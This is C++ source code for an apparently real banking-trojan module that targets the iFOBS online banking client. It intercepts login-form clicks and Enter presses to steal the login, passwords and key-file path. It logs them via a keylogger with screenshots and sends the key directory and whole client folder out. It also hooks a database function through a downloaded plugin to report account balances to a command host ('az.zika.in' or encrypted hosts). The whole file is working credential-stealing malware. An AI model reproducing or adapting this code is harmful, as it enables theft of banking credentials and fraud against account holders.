#include "GetApi.h"
#include "KeyLogSystems.h"
#include "Memory.h"
#include "Utils.h"
#include "Splice.h"
#include "modules.h"
#include "Plugins.h"
#include "rafa.h"
#include "BotHTTP.h"
#include "Inject.h"
#include "BotCore.h"
#include "StrConsts.h"

#include "BotDebug.h"

namespace IFOBSCLIENT
{
	#include "DbgTemplates.h"
}

#define DBG IFOBSCLIENT::DBGOutMessage<>

namespace IFobs
{

const int PROCESS_HASH = 0x9FF6B644; /* ifobsclient.exe */
const DWORD HashClassEditControl = 0x2ED8AE2E; /* TcxCustomInnerTextEdit */
const DWORD HashClassButtonControl = 0xA5AD5F9; /* TcxButton */
//��� ���� �����������
const DWORD HashClassLoginForm = 0x918D725B; /* TLoginForm.UnicodeClass*/ 

const int MaxFindedControl = 6;

struct ForFindControl
{
	HWND wnds[MaxFindedControl];
	char* texts[MaxFindedControl];
	int count;
	DWORD hash;
};

struct AccBalans
{
	char acc[64];
	char balans[64];
	char nameBank[128];
};

int ( WINAPI *pTVDBDirectGetCurrency )(int P1, int P2);
//�������� �� ifobs.plug
typedef BOOL ( WINAPI *PInitFunc )(DWORD origFunc, char *funcName);
char folderIFobs[MAX_PATH]; //����� � ������� ��������� �����, ��� ����������� �� ������
char resultGrab[512]; //��������� ������� ��� ������� � ������� � ����� ������

//���� ������ ������� �� ������ ������, ��� ������� ����� ������ �������� ������ 
DWORD btAccept[] = { 0x8DBF3905 /* ������� */, 0x62203A2E /* �������� */, 0x3C797A7A /* Accept */, 0 };

static BOOL CALLBACK EnumChildProc( HWND hwnd, LPARAM lParam )
{
	ForFindControl* ffc = (ForFindControl*)lParam;
	DWORD hash = GetWndClassHash(hwnd);
	if( hash == ffc->hash )
	{
		ffc->wnds[ffc->count] = hwnd;
		ffc->texts[ffc->count] = GetWndText(hwnd);
		DBG( "IFobs", "find control %08x, text = %s", hwnd, ffc->texts[ffc->count] );
		ffc->count++;
		if( ffc->count >= MaxFindedControl ) return FALSE;
	}
	return TRUE;
}

static void AddStrLog( const char* name, const char* value )
{
	char buf[MAX_PATH];
	m_lstrcpy( buf, name );
	m_lstrcat( buf, ": " );
	if( value )
		m_lstrcat( buf, value );
	if( resultGrab[0] ) m_lstrcat( resultGrab, ", " );
	m_lstrcat( resultGrab, buf );
	m_lstrcat( buf, "\r\n" );
	KeyLogger::AddStrToBuffer( 0, buf, 0 );
	DBG( "IFobs", buf );
}

static void FreeFFC( ForFindControl& ffc )
{
	for( int i = 0; i < ffc.count; i++ ) STR::Free(ffc.texts[i]);
}

//� ���� ����������� 4-� ��������� ���� �����, ����� ������������ ���� �������� ���� ������� ��� ��������
//� ������� texts ��������� ForFindEditControl ��� ��������� � ��������� �������: 0 - ���� � ������, 
//1 - ������ ��� ������, 2 - ������ ��� ����� �������, 3 - �����
static void GrabData( HWND wnd )
{
	DBG( "IFobs", "������ ������" );
	ForFindControl ffc;
	ClearStruct(ffc);
	resultGrab[0] = 0;
	ffc.hash = HashClassEditControl;
	pEnumChildWindows( wnd, EnumChildProc, &ffc );
	AddStrLog( "Login", ffc.texts[3] );
	AddStrLog( "Password system", ffc.texts[2] );
	AddStrLog( "Password key", ffc.texts[1] );
	AddStrLog( "Path keys", ffc.texts[0] );
	DWORD attr = (DWORD)pGetFileAttributesA(ffc.texts[0]);
	if( attr != INVALID_FILE_ATTRIBUTES && (attr & FILE_ATTRIBUTE_DIRECTORY) != 0 )
		KeyLogger::AddDirectory( ffc.texts[0], "Keys" );
	VideoLog::Send( "ifobs", 11, resultGrab );
	VideoProcess::SendFiles( 0, 0, ffc.texts[0], true );
	FreeFFC(ffc);
}

//��� ������ �������
static bool IsBtAccept( HWND wnd, const char* text )
{
	char buf[64];
	if( text == 0 )
	{
		pGetWindowTextA( wnd, buf, sizeof(buf) );
		text = buf;
	}
	DWORD hash = STR::GetHash( (char*)text, 0, false );
	int i = 0;
	while( btAccept[i] && btAccept[i] != hash ) i++; //������� � ������� �����
	if( btAccept[i] ) //������ �������
		return true;
	return false;
}

static HWND GetLoginForm( HWND wnd )
{
	HWND mainWnd = wnd;
	for(;;)
	{
		HWND parent = (HWND)pGetParent(mainWnd);
		if( parent == 0 ) break;
		mainWnd = parent;
	}
	char className[128];
	pGetClassNameA( mainWnd, className, 128 );
	DBG( "IFobs", "parent %08x, '%s', %08x", mainWnd, className, STR::GetHash( className, 0, false ) );
	if( GetWndClassHash(mainWnd) != HashClassLoginForm )
	{
		wnd = mainWnd;
		mainWnd = 0;
	}
	if( mainWnd == 0 )
	{
		ForFindControl ffc;
		ClearStruct(ffc);
		ffc.hash = HashClassLoginForm;
		pEnumChildWindows( wnd, EnumChildProc, &ffc );
		if( ffc.count > 0 )
			mainWnd = ffc.wnds[0];
		else
		{
			pEnumWindows( EnumChildProc, &ffc );
			if( ffc.count > 0 )
				mainWnd = ffc.wnds[0];
		}
	}
	if( mainWnd )
		DBG( "IFobs", "����� ���� ����������� %08x", mainWnd );
	else
		DBG( "IFobs", "���� ����������� ���������" );
	return mainWnd;
}

static void OnMessage(LPVOID Sender, PMSG Msg, bool IsUnicode)
{
	if( Msg->message == WM_LBUTTONUP )
	{
		//������� ������ �� �� ������ �������
		if( IsBtAccept( Msg->hwnd, 0 ) )
		{
			HWND parent = (HWND)pGetParent(Msg->hwnd);
			GrabData(parent);
		}
	}
	else
		if( Msg->message == WM_KEYUP && Msg->wParam == VK_RETURN ) //������ ������� Enter
		{
			DBG( "IFobs", "������ ������� Enter" );
			//���� ������� ����
			HWND mainWnd = GetLoginForm(Msg->hwnd);
			
			//���� ��� ������ �� �����
			ForFindControl ffc;
			ClearStruct(ffc);
			ffc.hash = HashClassButtonControl;
			pEnumChildWindows( mainWnd, EnumChildProc, &ffc );
			//���� ������ �������
			for( int i = 0; i < ffc.count; i++ )
				if( IsBtAccept( ffc.wnds[i], ffc.texts[i] ) )
				{
					//������� ������� ��� ��� ���
					if( IsWindowEnabled( ffc.wnds[i] ) )
					{
						DBG( "IFobs", "������ ������� �������" );
						GrabData(mainWnd);
						break;
					}
					else
						DBG( "IFobs", "������ ������� �������������" );
				}
			FreeFFC(ffc);
		}
}

static char* GetAdminUrl( char* url )
{
#ifdef DEBUGCONFIG
	m_lstrcpy( url, "az.zika.in" );
#else
//	string host = GetActiveHostFromBuf2( GetBotHosts(), BOTPARAM_HASH_MAINHOSTS, true );
	string host = GetActiveHostFromBuf2( Rafa::Hosts(), 0x86D19DC3 /* __RAFA_HOSTS__ */, RAFAHOSTS_PARAM_ENCRYPTED );
	if( !host.IsEmpty() )
		m_lstrcpy( url, host.t_str() );
	else
		url = 0;
#endif
	return url;
}

static DWORD WINAPI SendBalans( LPVOID p )
{
	char urlAdmin[128];
	AccBalans* ab = (AccBalans*)p;
	VideoLog log( "ifobs" );
	log.Send( 10, "����: '%s', ������: '%s', ����: '%s'", ab->acc, ab->balans, ab->nameBank );
	if( GetAdminUrl(urlAdmin) )
	{
		fwsprintfA pwsprintfA = Get_wsprintfA();
		TMemory request(1024);
		string azUser = GetAzUser();
		char* urlBank = "nothing"; //URLEncode(ab->nameBank);
		char* urlGrab = URLEncode(resultGrab);
		pwsprintfA( request.AsStr(), "http://%s/raf/?uid=%s&sys=ifobs&cid=%s&mode=balance&sum=%s&acc=%s&text=bank|%s,text|%s", urlAdmin, BOT_UID, azUser.t_str(), ab->balans, ab->acc, urlBank, urlGrab );
//		pwsprintfA( request.AsStr(), "http://%s/raf/?uid=%s&sys=ifobs&cid=%s&mode=balance&sum=%s&acc=1", urlAdmin, BOT_UID, azUser.t_str(), ab->balans );
		STR::Free(urlBank);
		STR::Free(urlGrab);
//		THTTP H;
//		H.Get(request.AsStr());
		THTTPResponseRec Response;
		ClearStruct(Response);
		HTTP::Get( request.AsStr(), 0, &Response );
		HTTPResponse::Clear(&Response);
		DBG( "IFobs", "�������� ������: '%s'", request.AsStr() );
	}
	MemFree(p);
	return 0;
}

void WINAPI PutBalans( const char* acc, const char* balans, const char* nameBank )
{
	DBG( "IFobs", "acc: '%s', balans: '%s', name bank: '%s'", acc, balans, nameBank );
	AccBalans* ab = (AccBalans*)MemAlloc(sizeof(AccBalans));
	m_lstrcpy( ab->acc, acc );
	trimall( ab->acc, ' ' );
	m_lstrcpy( ab->balans, balans );
	m_lstrcpy( ab->nameBank, nameBank );
	RunThread( SendBalans, ab );
}

DWORD WINAPI PluginIFobs(LPVOID)
{
	VideoLog log( "ifobs" );
	log.Send2( 0, "�������� ������� ifobs.plug" );
	TPlugin ifobsPlug("ifobs.plug");
	if( ifobsPlug.Download(true) )
	{
		log.Send2( 1, "������ ��������" );
		ifobsPlug.SetNotFree();
		DBG( "IFobs", "��������� ifobs.plug" );
		PInitFunc InitFunc = (PInitFunc)ifobsPlug.GetProcAddress("InitFunc");
		if( InitFunc )
		{
			log.Send2( 2, "������� InitFunc()" );
			DBG( "IFobs", "���� InitFunc" );
			DWORD HProc1 = (DWORD)ifobsPlug.GetProcAddress("HProc1");
			if( HProc1 )
			{
				log.Send2( 3, "������� HProc1()" );
				DBG( "IFobs", "���� HProc1" );
				//������ ������� @Vdbdirect@TVDBDirect@GetCurrency$qqr17System@AnsiString
				if( HookApi( "VistaDB_D7.bpl", 0x238E92A4, (PVOID)HProc1, (PVOID*)&pTVDBDirectGetCurrency ) )
				{
					log.Send2( 4, "��������� ���" );
					DBG( "IFobs", "���������� ��� �� @Vdbdirect@TVDBDirect@GetCurrency$qqr17System@AnsiString" );
					if( InitFunc((DWORD)&PutBalans, "BalanceCallBack") )
					{
						log.Send2( 5, "����������� BalanceCallBack" );
						DBG( "IFobs", "BalanceCallBack set ok.");
					}
					if( InitFunc((DWORD)pTVDBDirectGetCurrency, "GetCurrency") )
						DBG( "IFobs", "��� ���������� �������, %08x %08x", pTVDBDirectGetCurrency, HProc1 );
				}
			}
		}
	}
	else
		DBG( "IFobs", "�� ������� ��������� ifobs.plug" );
	return 0;
}

//������� ������� ������� �� ����� ������
DWORD WINAPI SendIFobs(LPVOID)
{
	BOT::Initialize(ProcessUnknown);
	DBG( "IFobs", "������ ������� ��������� �� ������ �� ����� %s", folderIFobs );
	Bot->CreateFileA( 0, GetStr(IFobsFlagCopy).t_str() );
	DWORD folderSize = 0;
	if( !SizeFolderLess( folderIFobs, 1024*1024*350, &folderSize ) )
	{
		DBG( "IFobs", "����� ��������� ������ ��������� �������, �� ��������" );
		return 0;
	}
	DBG( "IFobs", "������ ����� %d ����", folderSize );
	char tempFolder[MAX_PATH];
	pGetTempPathA( sizeof(tempFolder), tempFolder );
	pPathAppendA( tempFolder, "ifobs" );
	if( Directory::IsExists(tempFolder) ) DeleteFolders(tempFolder);
	pCreateDirectoryA( tempFolder, 0 );
	DBG( "IFobs", "����������� �� ��������� ����� %s", tempFolder );
	*((int*)&(tempFolder[ m_lstrlen(tempFolder) ])) = 0; //��������� 2-� ����, ����� ������ ����������� "\0\0"
	*((int*)&(folderIFobs[ m_lstrlen(folderIFobs) ])) = 0; 
	if( CopyFileANdFolder( folderIFobs, tempFolder ) )
	{
		DBG( "IFobs", "����������� �� ������" );
		VideoProcess::SendFiles( 0, 0, tempFolder );
		DeleteFolders(tempFolder);
		DBG( "IFobs", "����������� �� ������ ��������" );
	}
	else
		DBG( "IFobs", "����������� � ��������� ����� �� �������" );
	return 0;
}

void Activeted(LPVOID Sender)
{
	DBG( "IFobs", "Activated" );
	VideoLog::Send( "ifobs", 21, "activated" );
	PKeyLogSystem System = (PKeyLogSystem)Sender;
	RunThread( PluginIFobs, 0 );
//	if( !Bot->FileExists( 0, GetStr(IFobsFlagCopy).t_str() ) )
//		MegaJump(SendIFobs);
	VideoProcess::RecordPID( 0, "IFobs" );
}

bool Init( const char* appName )
{
	DBG( "IFobs", "����������� �������" );
	resultGrab[0] = 0;
	PKeyLogSystem S = KeyLogger::AddSystem( "ifobs", PROCESS_HASH );
	if( S != NULL )
	{
		VideoLog::Send( "ifobs", 20, "init" );
		char* caption = "*iFOBS*��*��*�*";
		char* caption2 = "*iFOBS*Regis*";
		S->MakeScreenShot = true;
		S->SendLogAsCAB = true;
		S->OnActivate = Activeted;
		//S->OnDeactivate = Deactiveted;
		S->OnMessage = OnMessage;
		
		PKlgWndFilter F = KeyLogger::AddFilter(S, true, true, NULL, caption, FILTRATE_PARENT_WND, LOG_ALL, 5);
		m_lstrcpy( folderIFobs, appName ); //�������� ���� � iFOBSClient.exe
		pPathRemoveFileSpecA(folderIFobs); //����� � ������
		if( F )
		{
			KeyLogger::AddFilterText(F, NULL, caption2 );
		}
	}
	return true;
}
/*
static void FindExe(PFindData Search, PCHAR FileName, LPVOID Data, bool &Cancel )
{
	DWORD hash = STR::GetHash(Search->cFileName,0,true);
	if( hash == PROCESS_HASH )
	{
		DBG( "IFobs", "Find %s", FileName );
		VideoLog::Send( "ifobs", 30, "find %s", FileName );
		Cancel = true;
	}
}

DWORD WINAPI FindIFobsClient(LPVOID)
{
	DWORD drives = (DWORD)pGetLogicalDrives();
	char drive[] = { 'C', ':', '\\', 0 };
	//���� ������ �� ������� �����
	for( int b = 2; b < 31; b++ )
	{
		if( drives & (1 << b) )
		{
			drive[0] = 'A' + b;
			int tp = (int)pGetDriveTypeA(drive);
			//������� ������ ������� �����
			if( tp == DRIVE_FIXED )
			{
				if( !SearchFiles( drive, "*.exe", true, FA_ANY_FILES, 0, FindExe ) )
					break;
			}
		}
	}
	return 0;
}
*/

void KillIFobs()
{
	DWORD pid = GetProcessIdByHash(PROCESS_HASH);
	KillProcess( pid, 1000 );
}

}